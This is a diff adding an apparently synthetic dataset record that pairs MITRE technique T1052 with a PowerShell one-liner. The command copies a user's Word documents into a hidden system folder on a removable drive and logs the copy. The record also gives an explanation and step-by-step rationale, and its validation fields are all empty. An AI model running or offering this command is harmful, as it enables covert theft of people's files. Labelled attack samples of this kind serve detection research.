@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\SystemData\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h +s $dest; Copy-Item -Path \"$env:USERPROFILE\\Documents\\*.docx\" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Copied DOCX to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Copies local DOCX files to a hidden folder on a removable drive for physical exfiltration; logs the action locally using Write-Output.",
+  "rationale_steps": [
+    "Identify first attached removable drive letter",
+    "Create and hide a destination directory on the removable media",
+    "Copy target document files to the removable media using Copy-Item",
+    "Record a local operation log via Write-Output to a file on the device"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-2cf31eed",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
